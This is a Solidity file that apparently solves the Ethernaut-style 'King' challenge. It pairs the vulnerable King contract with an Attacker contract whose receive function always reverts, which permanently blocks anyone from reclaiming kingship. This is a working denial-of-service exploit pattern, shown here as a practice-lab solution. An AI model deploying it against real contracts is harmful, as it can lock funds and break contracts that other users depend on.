// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract Attacker {
    King public king;

    constructor(King _King) {
        king = _King;
    }

    function attack() public payable {
        require(msg.value >= address(king).balance, "Not enough balance");
        (bool success, ) = address(king).call{value: msg.value}("");
        require(success, "transfer failed");
    }

    receive() external payable {
        revert("sent eth failed");
    }
}
